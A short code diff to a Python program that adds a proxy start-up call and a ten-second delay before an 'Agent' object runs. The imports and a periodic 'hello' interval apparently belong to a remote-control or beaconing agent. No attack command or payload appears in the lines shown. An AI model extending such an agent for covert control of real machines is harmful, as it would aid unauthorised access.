@@ -16,6 +16,8 @@ import zipfile
 import tempfile
 import socket
 import getpass
+from proxy import Proxy
+import time
 
 
 if os.name == 'nt':
@@ -378,6 +380,8 @@ class Agent(object):
                 time.sleep(config.HELLO_INTERVAL)
 
 def main():
+    Proxy()
+    time.sleep(10)
     agent = Agent()
     agent.run()
 
